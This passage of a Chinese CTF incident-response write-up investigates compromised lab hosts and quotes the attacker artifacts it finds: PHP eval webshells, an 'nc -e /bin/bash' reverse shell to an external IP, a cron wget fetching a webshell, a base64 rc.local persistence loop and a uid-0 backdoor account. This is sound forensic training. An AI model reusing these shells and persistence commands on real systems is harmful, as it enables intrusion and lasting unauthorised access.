</span></span></code></pre></div><p><img alt=2025-03-06202915 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-06202915.png></p><h1 id=第九章-blueteam-的小心思3>第九章-blueteam 的小心思3</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span><span style=color:#66d9ef>1.</span> 审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip}
</span></span><span style=display:flex><span><span style=color:#66d9ef>2.</span> 审计流量包，木马文件连接密码是什么? flag{xxx}
</span></span><span style=display:flex><span><span style=color:#66d9ef>3.</span> 审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port}
</span></span><span style=display:flex><span><span style=color:#66d9ef>4.</span> 提交黑客上传恶意文件的 md5 md5sum xxx.so
</span></span><span style=display:flex><span><span style=color:#66d9ef>5.</span> 攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{http://xxxxxxxxxx/xx.xxx}
</span></span></code></pre></div><h2 id=q1-20>Q1</h2><p>下载通常使用的方法是nc的远程上传，curl的发包，以及已经shell的直接上传，在数据包里找curl就行，直接翻到最后</p><p><img alt=2025-03-05212604 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05212604.png></p><pre tabindex=0><code>flag{192.168.150.253}
</code></pre><h2 id=q2-20>Q2</h2><p>TCP追踪</p><pre tabindex=0><code>GET /shell.php HTTP/1.1
Host: 192.168.150.253:8080
User-Agent: curl/7.64.0
Accept: */*


0.000748s
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.5
Date: Thu, 21 Dec 2023 06:39:58 GMT
Content-type: application/octet-stream
Content-Length: 31
Last-Modified: Thu, 21 Dec 2023 06:25:03 GMT

&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;
</code></pre><p><code>flag{cmd}</code></p><h2 id=q3-20>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;display_errors&#34;</span>, <span style=color:#e6db74>&#34;0&#34;</span>);<span style=color:#f92672>@</span><span style=color:#a6e22e>set_time_limit</span>(<span style=color:#ae81ff>0</span>);$opdir<span style=color:#f92672>=@</span><span style=color:#a6e22e>ini_get</span>(<span style=color:#e6db74>&#34;open_basedir&#34;</span>);<span style=color:#66d9ef>if</span>($opdir) {$ocwd<span style=color:#f92672>=</span><span style=color:#a6e22e>dirname</span>($_SERVER[<span style=color:#e6db74>&#34;SCRIPT_FILENAME&#34;</span>]);$oparr<span style=color:#f92672>=</span><span style=color:#a6e22e>preg_split</span>(<span style=color:#a6e22e>base64_decode</span>(<span style=color:#e6db74>&#34;Lzt8Oi8=&#34;</span>),$opdir);<span style=color:#f92672>@</span><span style=color:#a6e22e>array_push</span>($oparr,$ocwd,<span style=color:#a6e22e>sys_get_temp_dir</span>());<span style=color:#66d9ef>foreach</span>($oparr <span style=color:#66d9ef>as</span> $item) {<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!@</span><span style=color:#a6e22e>is_writable</span>($item)){<span style=color:#66d9ef>continue</span>;};$tmdir<span style=color:#f92672>=</span>$item<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/.db70736&#34;</span>;<span style=color:#f92672>@</span><span style=color:#a6e22e>mkdir</span>($tmdir);<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!@</span><span style=color:#a6e22e>file_exists</span>($tmdir)){<span style=color:#66d9ef>continue</span>;}$tmdir<span style=color:#f92672>=</span><span style=color:#a6e22e>realpath</span>($tmdir);<span style=color:#f92672>@</span><span style=color:#a6e22e>chdir</span>($tmdir);<span style=color:#f92672>@</span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;open_basedir&#34;</span>, <span style=color:#e6db74>&#34;..&#34;</span>);$cntarr<span style=color:#f92672>=@</span><span style=color:#a6e22e>preg_split</span>(<span style=color:#e6db74>&#34;/</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>|\//&#34;</span>,$tmdir);<span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>sizeof</span>($cntarr);$i<span style=color:#f92672>++</span>){<span style=color:#f92672>@</span><span style=color:#a6e22e>chdir</span>(<span style=color:#e6db74>&#34;..&#34;</span>);};<span style=color:#f92672>@</span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;open_basedir&#34;</span>,<span style=color:#e6db74>&#34;/&#34;</span>);<span style=color:#f92672>@</span><span style=color:#a6e22e>rmdir</span>($tmdir);<span style=color:#66d9ef>break</span>;};};;<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>asenc</span>($out){<span style=color:#66d9ef>return</span> $out;};<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>asoutput</span>(){$output<span style=color:#f92672>=</span><span style=color:#a6e22e>ob_get_contents</span>();<span style=color:#a6e22e>ob_end_clean</span>();<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;f57f16&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;820073&#34;</span>;<span style=color:#66d9ef>echo</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>asenc</span>($output);<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;7d8b2c&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;f332af&#34;</span>;}<span style=color:#a6e22e>ob_start</span>();<span style=color:#66d9ef>try</span>{$D<span style=color:#f92672>=</span><span style=color:#a6e22e>dirname</span>($_SERVER[<span style=color:#e6db74>&#34;SCRIPT_FILENAME&#34;</span>]);<span style=color:#66d9ef>if</span>($D<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;&#34;</span>)$D<span style=color:#f92672>=</span><span style=color:#a6e22e>dirname</span>($_SERVER[<span style=color:#e6db74>&#34;PATH_TRANSLATED&#34;</span>]);$R<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>$D<span style=color:#e6db74>}</span><span style=color:#e6db74>	&#34;</span>;<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>substr</span>($D,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>)<span style=color:#f92672>!=</span><span style=color:#e6db74>&#34;/&#34;</span>){<span style=color:#66d9ef>foreach</span>(<span style=color:#a6e22e>range</span>(<span style=color:#e6db74>&#34;C&#34;</span>,<span style=color:#e6db74>&#34;Z&#34;</span>)<span style=color:#66d9ef>as</span> $L)<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_dir</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>$L<span style=color:#e6db74>}</span><span style=color:#e6db74>:&#34;</span>))$R<span style=color:#f92672>.=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>$L<span style=color:#e6db74>}</span><span style=color:#e6db74>:&#34;</span>;}<span style=color:#66d9ef>else</span>{$R<span style=color:#f92672>.=</span><span style=color:#e6db74>&#34;/&#34;</span>;}$R<span style=color:#f92672>.=</span><span style=color:#e6db74>&#34;	&#34;</span>;$u<span style=color:#f92672>=</span>(<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#34;posix_getegid&#34;</span>))<span style=color:#f92672>?@</span><span style=color:#a6e22e>posix_getpwuid</span>(<span style=color:#f92672>@</span><span style=color:#a6e22e>posix_geteuid</span>())<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;&#34;</span>;$s<span style=color:#f92672>=</span>($u)<span style=color:#f92672>?</span>$u[<span style=color:#e6db74>&#34;name&#34;</span>]<span style=color:#f92672>:@</span><span style=color:#a6e22e>get_current_user</span>();$R<span style=color:#f92672>.=</span><span style=color:#a6e22e>php_uname</span>();$R<span style=color:#f92672>.=</span><span style=color:#e6db74>&#34;	</span><span style=color:#e6db74>{</span>$s<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>;<span style=color:#66d9ef>echo</span> $R;;}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>Exception</span> $e){<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ERROR://&#34;</span><span style=color:#f92672>.</span>$e<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getMessage</span>();};<span style=color:#a6e22e>asoutput</span>();<span style=color:#66d9ef>die</span>();
</span></span></code></pre></div><p><strong>目录遍历攻击</strong>：攻击者试图通过操作 <code>open_basedir</code> 来绕过目录限制，访问和写入本不允许访问的目录。</p><p><strong>临时文件创建</strong>：攻击者创建并删除临时目录 (<code>.db70736</code>)，试图利用这些目录进行恶意操作。</p><p><strong>信息泄露</strong>：代码会泄露服务器的详细信息（如文件系统路径、当前用户、操作系统等），这些信息可以帮助攻击者进一步渗透系统。</p><p><strong>代码混淆</strong>：通过将输出包裹在自定义的字符串中，以及使用 <code>asenc()</code> 空操作，试图隐藏恶意行为。</p><p>我随便取了一段长的主要应该都是讲base64混淆,先找了一个解码一下去头，</p><pre tabindex=0><code>Y2QgIi8iO2NhdCAvZXRjL3JlZGlzLmNvbmY7ZWNobyAwY2EwNzY1ZTtwd2Q7ZWNobyAzNmE3MTQ=
cd &#34;/&#34;;cat /etc/redis.conf;echo 0ca0765e;pwd;echo 36a714
</code></pre><p>讲的应该是redis的主从然后传马，继续往下找</p><p><img alt=2025-03-05214009 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05214009.png></p><pre tabindex=0><code>cd &#34;/&#34;;nc -e /bin/bash 192.168.150.199 4444;echo 0ca0765e;pwd;echo 36a714
</code></pre><pre tabindex=0><code>flag{192.168.150.199:4444}
</code></pre><h2 id=q4-17>Q4</h2><p>明显不应该出现的so</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:~# ls /
</span></span><span style=display:flex><span>bin       etc             lib     lost+found  opt          run   tmp      vmlinuz.old
</span></span><span style=display:flex><span>boot      home            lib32   media       proc         sbin  usr
</span></span><span style=display:flex><span>dev       initrd.img      lib64   mnt         result.pcap  srv   var
</span></span><span style=display:flex><span>dump.rdb  initrd.img.old  libx32  module.so   root         sys   vmlinuz
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:~# md5sum /module.so
</span></span><span style=display:flex><span>d41d8cd98f00b204e9800998ecf8427e  /module.so
</span></span></code></pre></div><h2 id=q5-13>Q5</h2><p>先看看马</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:~# find / -type f -name <span style=color:#e6db74>&#34;shell.php&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@ip-10-0-10-1:~# 
</span></span><span style=display:flex><span>root@ip-10-0-10-1:~# find / -type f -name <span style=color:#e6db74>&#34;.shell.php&#34;</span>
</span></span><span style=display:flex><span>/var/www/html/secret/.shell.php
</span></span><span style=display:flex><span>root@ip-10-0-10-1:~# cat /var/www/html/secret/.shell.php
</span></span><span style=display:flex><span>&lt;?php <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>md5<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;password&#34;</span><span style=color:#f92672>])==</span><span style=color:#e6db74>&#34;accc9105df5383111407fd5b41255e23&#34;</span><span style=color:#f92672>){</span>@eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>])</span>;<span style=color:#f92672>}</span> ?&gt;
</span></span><span style=display:flex><span>root@ip-10-0-10-1:~# crontab -l
</span></span><span style=display:flex><span>no crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>root@ip-10-0-10-1:~# cat /etc/crontab
</span></span><span style=display:flex><span><span style=color:#75715e># /etc/crontab: system-wide crontab</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># command to install the new version when you edit this file</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and files in /etc/cron.d. These files also have username fields,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># that none of the other crontabs do.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SHELL<span style=color:#f92672>=</span>/bin/sh
</span></span><span style=display:flex><span>PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Example of job definition:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># .---------------- minute (0 - 59)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  .------------- hour (0 - 23)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  .---------- day of month (1 - 31)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  |  |</span>
</span></span><span style=display:flex><span><span style=color:#75715e># *  *  *  *  * user-name command to be executed</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span> *    * * *   root    cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.hourly
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>6</span>    * * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.daily <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span> <span style=color:#ae81ff>6</span>    * * <span style=color:#ae81ff>7</span>   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span> <span style=color:#ae81ff>6</span>    <span style=color:#ae81ff>1</span> * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*/1 * * * * /usr/bin/wget http://192.168.150.199:88/shell.php -O /var/www/html/secret/.shell.php
</span></span></code></pre></div><pre tabindex=0><code>http://192.168.150.199:88/shell.php
</code></pre><h1 id=linux后门应急>Linux后门应急</h1><h2 id=q1-21>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1、主机后门用户名称：提交格式如：flag{backdoor}
</span></span></code></pre></div><p>直接看etc/passwd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ cat /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>backdoor:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>user:x:1000:1000::/home/user:/bin/sh
</span></span><span style=display:flex><span>debian:x:1001:1002:Debian:/home/debian:/bin/bash
</span></span></code></pre></div><pre tabindex=0><code>flag{backdoor}
</code></pre><h2 id=q2-21>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>2、主机排查项中可以发现到flag{}内以i开头的flag，如flag{ixxxxxxx}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ ps aux | grep <span style=color:#e6db74>&#39;flag{i&#39;</span>
</span></span><span style=display:flex><span>root       <span style=color:#ae81ff>498</span>  0.0  0.0   <span style=color:#ae81ff>2368</span>  <span style=color:#ae81ff>1712</span> ?        S    05:20   0:00 nc -lvp <span style=color:#ae81ff>9999</span> -c flag<span style=color:#f92672>{</span>infoFl4g<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>user      <span style=color:#ae81ff>1461</span>  0.0  0.0   <span style=color:#ae81ff>6204</span>   <span style=color:#ae81ff>876</span> pts/1    S+   05:25   0:00 grep flag<span style=color:#f92672>{</span>i
</span></span></code></pre></div><h2 id=q3-21>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>3、主机排查发现9999端口是通过哪个配置文件如何开机启动的，如/etc/crontab则填写/etc/crontab 的md5 ，提交方式示例：flag{md5}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ sudo netstat -tuln | grep <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>sudo: unable to resolve host ip-10-0-10-10: Name or service not known
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> user: 
</span></span><span style=display:flex><span>user is not in the sudoers file.  This incident will be reported.
</span></span></code></pre></div><p>看不了没权限</p><pre tabindex=0><code>user@ip-10-0-10-10:/etc/systemd/system$ ls
cloud-init.target.wants                 getty.target.wants           sshd.service
dbus-org.freedesktop.timesync1.service  multi-user.target.wants      sysinit.target.wants
docker-compose-app.service              network-online.target.wants  syslog.service
docker.service                          rc-local.service             timers.target.wants
user@ip-10-0-10-10:/etc/systemd/system$ cat rc-local.service
[Unit]
Description=/etc/rc.local Compatibility
ConditionPathExists=/etc/rc.d/rc.local
After=network.target

[Service]
Type=forking
ExecStart=/etc/rc.d/rc.local start
TimeoutSec=0
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
user@ip-10-0-10-10:/etc/systemd/system$ md5sum /etc/rc.d/rc.local
41b84d57c502fb2a6fdf173a003d42ab  /etc/rc.d/rc.local
user@ip-10-0-10-10:/etc/systemd/system$ cat /etc/rc.d/rc.local
#!/bin/bash

echo d2hpbGUgdHJ1ZTtkbyBub2h1cCBuYyAtbHZwIDk5OTkgLWMgImZsYWd7aW5mb0ZsNGd9IiAyPiYxIDtzbGVlcCAxO2RvbmU7 | base64 -d | nohup bash &amp;
exit 0
</code></pre><p>里面是shell说明就是<code>/etc/rc.d/rc.local</code></p><pre tabindex=0><code>cf8a978fe83579e2e20ec158524d8c06
</code></pre><h2 id=q4-18>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>4、黑客3s做了记录所有用户的每次登陆的密码的手段，flag为黑客记录的登陆密码日志路径md5,提交方式示例：flag{md5(路径)}
</span></span></code></pre></div><p>考虑到会记录密码，而user的密码是已知的，可以搜索密码的位置</p><pre tabindex=0><code>find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -exec grep -nw &#34;Atmbctfer!&#34; {} +
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ find / <span style=color:#ae81ff>\(</span> -path /proc -o -path /sys -o -path /dev <span style=color:#ae81ff>\)</span> -prune -o -type f -exec grep -nw <span style=color:#e6db74>&#34;Atmbctfer!&#34;</span> <span style=color:#f92672>{}</span> +
</span></span><span style=display:flex><span>find: ‘/root’: Permission denied
</span></span><span style=display:flex><span>find: ‘/tmp/systemd-private-e9c3be86d5f24e96b25cee30996f5084-apache2.service-bnbsfB’: Permission denied
</span></span><span style=display:flex><span>find: ‘/tmp/systemd-private-e9c3be86d5f24e96b25cee30996f5084-systemd-timesyncd.service-91IQBH’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/containerd’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/docker’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/sudo’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/log/journal/5ec1569a54db475f89e930b5454dc309’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/systemd/unit-root’: Permission denied
</span></span><span style=display:flex><span>find: ‘/run/systemd/inaccessible’: Permission denied
</span></span><span style=display:flex><span>find: ‘/lost+found’: Permission denied
</span></span><span style=display:flex><span>/tmp/.sshlog:1:user :Atmbctfer! 
</span></span><span style=display:flex><span>/tmp/.sshlog:2:user :Atmbctfer! 
</span></span><span style=display:flex><span>/tmp/.sshlog:3:user :Atmbctfer!
</span></span></code></pre></div><pre tabindex=0><code>flag{8997d5a1b8dcca5a4be75962250959f7}
</code></pre><h2 id=q5-14>Q5</h2><pre tabindex=0><code>5、给出使用了/bin/bash 的RCE后门进程名称+端口号 如进程名称为sshd，端口号为22，则flag{sshd22}
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ netstat -anopt
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>servers and established<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:9294            0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:9999            0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      1283/python3         off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:81              0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:8443            0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:222             0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:2823            0.0.0.0:*               LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.0.10.10:222          58.218.234.99:4737      ESTABLISHED -                    keepalive <span style=color:#f92672>(</span>5542.96/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::9294                 :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::80                   :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::81                   :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::8443                 :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::222                  :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::2823                 :::*                    LISTEN      -                    off <span style=color:#f92672>(</span>0.00/0/0<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>尝试nc连接</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ nc 127.0.0.1 <span style=color:#ae81ff>8080</span>
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>nginx
</span></span><span style=display:flex><span>Nomal.so
</span></span><span style=display:flex><span>ls /
</span></span><span style=display:flex><span>bin
</span></span><span style=display:flex><span>boot
</span></span><span style=display:flex><span>dev
</span></span><span style=display:flex><span>etc
</span></span><span style=display:flex><span>home
</span></span><span style=display:flex><span>initrd.img
</span></span><span style=display:flex><span>initrd.img.old
</span></span><span style=display:flex><span>lib
</span></span><span style=display:flex><span>lib32
</span></span><span style=display:flex><span>lib64
</span></span><span style=display:flex><span>libx32
</span></span><span style=display:flex><span>lost+found
</span></span><span style=display:flex><span>media
